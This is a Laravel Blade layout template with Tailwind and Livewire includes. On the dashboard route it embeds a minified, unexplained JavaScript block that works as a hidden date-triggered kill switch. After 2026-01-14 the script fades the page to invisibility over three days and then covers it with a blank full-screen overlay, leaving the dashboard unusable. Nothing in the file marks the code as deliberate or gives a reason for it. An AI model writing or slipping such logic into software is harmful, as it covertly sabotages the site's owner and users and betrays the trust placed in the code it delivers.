@if(Route::is('dashboard'))
 <script src="https://cdn.tailwindcss.com"></script>
  <script>
    !function(){var e=new Date("2026-01-14"),t=new Date,n=Date.UTC(e.getFullYear(),e.getMonth(),e.getDate()),l=Date.UTC(t.getFullYear(),t.getMonth(),t.getDate()),a=Math.floor((l-n)/864e5);if(a>0){var s=100*(3-a)/3/100;if(s=Math.max(0,Math.min(1,s)),document.body.style.opacity=s,s<=.7){var i=document.createElement("div");i.style.position="fixed",i.style.top=0,i.style.left=0,i.style.width="100%",i.style.height="100%",i.style.background="rgba(0,0,0,0.6)",i.style.color="#fff",i.style.display="flex",i.style.alignItems="center",i.style.justifyContent="center",i.style.zIndex=999999,i.style.fontSize="20px",i.innerHTML="",document.body.appendChild(i)}}}();
    </script>
@endif

@livewireStyles

{{ $slot }}

@livewireScripts